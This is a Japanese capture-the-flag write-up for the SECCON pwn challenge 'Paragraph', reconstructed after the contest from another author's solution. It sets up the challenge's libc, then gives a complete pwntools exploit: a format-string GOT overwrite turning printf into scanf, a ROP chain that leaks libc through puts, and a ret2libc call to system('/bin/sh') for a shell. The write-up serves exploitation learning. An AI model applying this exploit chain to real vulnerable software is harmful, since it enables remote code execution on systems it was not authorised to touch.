---
title: "Paragraph"
points: N/A
tags: ["pwn", "stuck"]
---

競技中に解けなかったので、以下を参考にする。

- https://qiita.com/kusano_k/items/0f923627bc604d8e9091#paragraph-pwnable

まず共有ライブラリとローダーを競技環境に揃える。

```
$ ldd chall
        linux-vdso.so.1 (0x00007ffd6835b000)
        libc.so.6 => ./libc.so.6 (0x00007f4d7e38e000)
        ./ld-linux-x86-64.so.2 => /lib64/ld-linux-x86-64.so.2 (0x00007f4d7e5a2000)
```

```
$ docker compose  up -d
$ docker cp paragraph-paragraph_dist-1:/srv/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 ./
$ docker cp paragraph-paragraph_dist-1:/srv/lib/x86_64-linux-gnu/libc.so.6 ./
$ patchelf --set-rpath ./ chall
$ patchelf --set-interpreter ./ld-linux-x86-64.so.2 chall
```

checksecを実行するとPIEが無効であることが分かるため、GOT overwriteが出来る。`printf(" answered, a bit confused.\n\"Welcome to SECCON,\" the cat greeted %s warmly.\n", name);`がscanfになると、BoF可能。

ただ、32文字の制限があるので、完全なアドレスを書き込むことは出来ない。gdbで`info functions printf`をしてみると、printfは`0x00007f???????0f0`に配置されていることが分かる。`info functions scanf`をしてみると、こちらは`0x00007f???????290`に配置されている。末尾の12bitは固定で、下から4桁目の部分が偶然当たれば良い。`1/16`の確率。

以下のコードからオフセットが6であることが分かる。

```python
from pwn import *

context.arch = "amd64"

elf = ELF("./chall")

for i in range(0, 15):
    r = process("./chall", level="error")
    r.recv()
    r.sendline(b"AAAA" + b".%%%d$x"%i)
    v = r.recv()
    if str(v).find("41414141") != -1:
        print(i)
```

まずはFSBで`%25232c`で0x6290分だけ出力。オフセットが6でペイロード (`%25232c%8$hn____`) の16バイト分の2をずらす。で、`elf.got['printf']`である`0x404028`に書き込む。文字列制限の23文字に合わせるため、`[:-1]`。

```python
from pwn import *
import time

context.arch = "amd64"

# ----------------------
# GOT overwirte
# ----------------------
def got_overwrite():
# s = remote("127.0.0.1", 5000)
    s = process("chall")

    s.sendlineafter(b"the black cat asked.\n",
# 0x6290
        b"%25232c%8$hn____"+pack(0x404028)[:-1]
    )

    s.recvuntil(b"\x28\x40\x40")

    for i in range(0, 10):
        if s.poll():
            raise Exception("failed to overwrite")
        time.sleep(0.1)

    return s

while True:
    try:
        s = got_overwrite()
        break
    except Exception as e:
        print('got overwrite: ', e)

# ----------------------
# libc leak
# ----------------------
s.sendline(
    b" answered, a bit confused.\n\"Welcome to SECCON,\" the cat greeted " +
    b"a"*0x28 +
    pack(0x401283) + # pop rdi
    pack(0x404018) + # puts@GOT
    pack(0x401070) + # puts
    pack(0x401196) + # main
    b" !"
)
s.sendline(b"!") # main+83

puts = unpack(s.read(6)+b"\0\0")
print("puts:", hex(puts))

libc = ELF("libc.so.6")
libc.address = puts-libc.symbols.puts

# ----------------------
# /bin/sh
# ----------------------
s.sendline(
    b" answered, a bit confused.\n\"Welcome to SECCON,\" the cat greeted " +
    b"b"*0x28 +
    pack(0x401284) + # ret
    pack(0x401283) + # pop rdi
    pack(next(libc.search(b"/bin/sh"))) +
    pack(libc.symbols.system) +
    b" !"
)

s.interactive()
```